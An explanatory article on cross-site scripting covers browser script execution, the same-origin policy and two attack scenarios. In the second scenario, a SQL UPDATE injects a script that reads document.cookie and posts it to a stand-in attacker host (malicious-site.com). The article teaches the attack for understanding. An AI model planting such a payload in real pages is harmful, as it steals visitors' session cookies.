Cross-Site Scripting (XSS) occurs when malicious scripts, typically in the form of client-side code (usually JavaScript), into web pages viewed by other users. This injection can lead to unintended and potentially harmful behavior in the application.

## How XSS Works

XSS exploits the trust a user has in a particular website. When a web application doesn't properly validate or encode user input, it creates an opportunity for attackers to inject malicious scripts into the application's output.

### Browser Behavior and JavaScript Execution

To understand XSS, it's crucial to know how web browsers handle the content they receive:

1. **HTML Parsing**: When a browser loads a web page, it parses the HTML content, creating the Document Object Model (DOM) - a structural representation of the page.
2. **JavaScript Execution**: As part of this process, the browser automatically executes any JavaScript code it encounters. This code can be found in several places:
    - Within `<script>` tags in the HTML
    - In external JavaScript files linked via `<script src="...">` tags
    - In event handlers (e.g., `onclick="..."` attributes)
    - In URLs using the `javascript:` protocol
3. **Dynamic Content**: JavaScript can modify the DOM, allowing it to change the page's content and structure dynamically.
4. **Same-Origin Policy**: Browsers implement a security measure called the Same-Origin Policy, which restricts how a document or script loaded from one origin can interact with a resource from another origin. However, this doesn't prevent XSS attacks within the same origin.

#### What's an origin?

An "origin" in web security is defined by the combination of three things:

1. The scheme (protocol)
2. The hostname (domain)
3. The port number

More precisely:

1. Scheme: This is typically "http" or "https", but could also be other protocols like "ftp".
2. Hostname: This is the domain name or IP address of the server.
3. Port: This is the port number if specified. If no port is explicitly specified, the default port for the scheme is used (80 for HTTP, 443 for HTTPS).

For example:

- [https://www.example.com:443](https://www.example.com:443)
- [http://subdomain.example.com](http://subdomain.example.com)
- [https://example.com:8080](https://example.com:8080)

Each of these would be considered a different origin.

## Example XSS Scenario #1

Imagine a website that allows user comments. 

Here's how an XSS attack might unfold:

1. The attacker posts a comment containing malicious JavaScript code:
```js
Great article.

<script>
// put some malicioius javascript code here
</script>

Thanks for the writeup!
```

2. If the site doesn't properly sanitize this input, it might save the comment as-is in its database.
3. When other users view the page with this comment, their browsers will:
	1. Parse the HTML of the page
	2. Encounter the `<script>` tag within the comment
	3. Automatically execute the JavaScript code inside the script tag

^ This automatic execution of JavaScript is what makes XSS attacks so potent. The malicious code runs with the privileges of the website it's on, giving it access to sensitive data that the site has access to.

### What kind of malicious code?
Things like:
1. Stealing the user's cookies (which might contain session information)
2. Making requests to the website on behalf of the user
3. Logging keystrokes
4. Redirecting the user to a phishing site

## Example XSS Scenario #2: Database Compromise

In this scenario, we'll explore how XSS can occur when a website's database has been compromised, allowing an attacker to insert malicious scripts directly into the page content.

1. The attacker gains unauthorized access to the website's database, bypassing normal input channels and validation processes.
2. The attacker locates a table in the database that stores content directly output to web pages, such as article bodies, product descriptions, or site announcements.
3. The attacker inserts malicious JavaScript code into one or more of these content fields. 

**For example:**

```sql
UPDATE articles 
SET content = CONCAT(content, 

'<script>
// Malicious code here

let sensitive_data = document.cookie;
let attacker_url = "https://malicious-site.com/steal_data.php";
fetch(attacker_url, {
  method: "POST",
  body: JSON.stringify({stolen_data: sensitive_data})
});
</script>'
)

WHERE id = 12345;
```
    
4. When users visit the compromised page(s), their browsers will:
	1. Load the page content from the database
	2. Parse the HTML, including the injected script
	3. Automatically execute the malicious JavaScript code
5. The malicious code runs in the context of the trusted website, potentially:
	1. Stealing user cookies or session information
	2. Capturing form inputs (including passwords)
	3. Modifying the page content to display phishing forms
	4. Redirecting users to malicious sites

### Why This Scenario is Particularly Dangerous

1. **Bypasses Input Validation**: Since the attacker inserted the code directly into the database, any client-side or server-side input validation for user-submitted content is bypassed.
2. **Wide Impact**: A single database insertion could potentially affect thousands of users who view the compromised page(s).
3. **Difficulty in Detection**: The malicious code is served as part of the website's legitimate content, making it harder for security tools to detect.
4. **Persistence**: Until the compromise is detected and fixed, the XSS attack will continue to affect users, even if the initial database breach has been addressed.
5. **Trust Exploitation**: Users are more likely to trust content that appears to be a core part of the website rather than user-generated content.